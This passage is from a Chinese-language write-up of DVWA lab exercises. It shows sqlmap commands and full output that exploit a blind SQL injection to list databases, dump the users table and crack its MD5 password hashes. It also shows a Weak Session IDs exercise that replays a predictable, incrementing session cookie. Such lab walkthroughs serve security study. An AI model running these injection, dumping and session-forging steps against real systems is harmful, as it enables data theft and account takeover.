  - `404(Not Found)`是由于`sqlmap`在尝试UNION查询，它在探测列数和类型时，尝试大量的随机路径和畸形请求，触发了服务器的404响应，但显示了`POST parameter 'id' is vulnerable`，则404错误可以忽略，不影响数据提取
  - 接下来可以进行脱裤（数据提取），由于已经运行过，`sqlmap`会使用缓存
### 脱裤
获取所有数据库名：`sqlmap -r "~/Desktop/DVWA/sqlinblind/1.txt" --second-url "http://192.168.242.231/vulnerabilities/sqli_blind/" --dbs --batch`
```SHELL
available databases [2]:
[*] dvwa
[*] information_schema
```

获取`dvwa`库中的所有表：`sqlmap -r "~/Desktop/DVWA/sqlinblind/1.txt" --second-url "http://192.168.242.231/vulnerabilities/sqli_blind/" -D dvwa --tables --batch`
```SHELL
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

提取`users`表的账号和密码：`sqlmap -r "~/Desktop/DVWA/sqlinblind/1.txt" --second-url "http://192.168.242.231/vulnerabilities/sqli_blind/" -D dvwa -T users --dump --batch`
```SHELL
┌──(kali㉿kali)-[~]
└─$ sqlmap -r "~/Desktop/DVWA/sqlinblind/1.txt" --second-url "http://192.168.242.231/vulnerabilities/sqli_blind/" -D dvwa -T users --dump --batch
        ___
       __H__                                                                 
 ___ ___[.]_____ ___ ___  {1.9.11#stable}                                    
|_ -| . [)]     | .'| . |                                                    
|___|_  [,]_|_|_|__,|  _|                                                    
      |_|V...       |_|   https://sqlmap.org                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:24:22 /2026-01-15/

[02:24:22] [INFO] parsing HTTP request from '/home/kali/Desktop/DVWA/sqlinblind/1.txt'                                                                    
[02:24:22] [INFO] resuming back-end DBMS 'mysql' 
[02:24:22] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4501=4501 AND 'ESIG'='ESIG&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: id=1' OR SLEEP(5)#&Submit=Submit
---
[02:24:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[02:24:22] [INFO] fetching columns for table 'users' in database 'dvwa'
[02:24:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:24:22] [INFO] retrieved: 8
[02:24:23] [INFO] retrieved: user_id
[02:24:38] [INFO] retrieved: first_name
[02:24:51] [INFO] retrieved: last_name
[02:25:20] [INFO] retrieved: user
[02:25:29] [INFO] retrieved: password
[02:25:52] [INFO] retrieved: avatar
[02:26:08] [INFO] retrieved: last_login
[02:26:19] [INFO] retrieved: failed_login
[02:26:36] [INFO] fetching entries for table 'users' in database 'dvwa'
[02:26:36] [INFO] fetching number of entries for table 'users' in database 'dvwa'                                                                         
[02:26:36] [INFO] retrieved: 5
[02:26:39] [INFO] retrieved: 1337
[02:26:47] [INFO] retrieved: /hackable/users/1337.jpg
[02:27:39] [INFO] retrieved: 0
[02:27:40] [INFO] retrieved: Hack
[02:27:57] [INFO] retrieved: 2025-08-02 10:46:48
[02:28:50] [INFO] retrieved: Me
[02:28:57] [INFO] retrieved: 8d3533d75ae2c3966d7e0d4fcc69216b
[02:30:15] [INFO] retrieved: 3
[02:30:16] [INFO] retrieved: admin
[02:30:28] [INFO] retrieved: /hackable/users/admin.jpg
[02:31:03] [INFO] retrieved: 0
[02:31:08] [INFO] retrieved: admin
[02:31:18] [INFO] retrieved: 2025-08-02 10:46:48
[02:32:02] [INFO] retrieved: admin
[02:32:16] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[02:33:18] [INFO] retrieved: 1
[02:33:18] [INFO] retrieved: gordonb
[02:33:34] [INFO] retrieved: /hackable/users/gordonb.jpg
[02:33:58] [INFO] retrieved: 0
[02:33:58] [INFO] retrieved: Gordon
[02:34:04] [INFO] retrieved: 2025-08-02 10:46:48
[02:34:35] [INFO] retrieved: Brown
[02:34:47] [INFO] retrieved: e99a18c428cb38d5f260853678922e03
[02:35:49] [INFO] retrieved: 2
[02:35:51] [INFO] retrieved: pablo
[02:35:59] [INFO] retrieved: /hackable/users/pablo.jpg
[02:37:06] [INFO] retrieved: 0
[02:37:11] [INFO] retrieved: Pablo
[02:37:16] [INFO] retrieved: 2025-08-02 10:46:48
[02:37:49] [INFO] retrieved: Picasso
[02:37:56] [INFO] retrieved: 0d107d09f5bbe40cade3de5c71e9e9b7
[02:38:44] [INFO] retrieved: 4
[02:38:49] [INFO] retrieved: smithy
[02:39:05] [INFO] retrieved: /hackable/users/smithy.jpg
[02:39:45] [INFO] retrieved: 0
[02:39:47] [INFO] retrieved: Bob
[02:39:48] [INFO] retrieved: 2025-08-02 10:46:48
[02:40:28] [INFO] retrieved: Smith
[02:40:32] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[02:42:19] [INFO] retrieved: 5
[02:42:23] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[02:42:23] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[02:42:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[02:42:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[02:42:23] [INFO] starting 4 processes 
[02:42:24] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                   
[02:42:24] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                  
[02:42:25] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                  
[02:42:25] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                 
Database: dvwa                                                              
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2025-08-02 10:46:48 | 0            |
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2025-08-02 10:46:48 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2025-08-02 10:46:48 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2025-08-02 10:46:48 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2025-08-02 10:46:48 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[02:42:28] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.242.231/dump/dvwa/users.csv'                       
[02:42:28] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 2022 times
[02:42:28] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.242.231'                                         

[*] ending @ 02:42:28 /2026-01-15/
```

## Weak Session IDs(low)
### 源码
```PHP
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?> 
```

### 侦测
第二次点击`Generate`，经burp suite抓包，结果如下
```HTTP
POST /vulnerabilities/weak_id/ HTTP/1.1
Host: 192.168.242.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://192.168.242.208
Connection: keep-alive
Referer: http://192.168.242.208/vulnerabilities/weak_id/
Cookie: dvwaSession=1; PHPSESSID=teftehglqoqq699k9ka4mhk1s6; security=low
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
- 可看见cookie中的`dvwaSession`是线性递增的
- `PHPSESSID`不变：因为这是PHP引擎自动生成的，只要不关闭浏览器，不清除Cookie，或者后端没有调用`seesion_regenerate_id()`，这个ID就会一直保持不变。
### 渗透
构造payload
`dvwaSession=1; PHPSESSID=teftehglqoqq699k9ka4mhk1s6; security=low`
接着跳回宿主机的edge使用hackbar，勾选上`Cookies`，输入payload，并输入URL网页`http://192.168.242.208/vulnerabilities/weak_id/`，成功登录进入Weak Session IDs页面

## Weak Session IDs(Medium)
### 源代码
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
?> 
```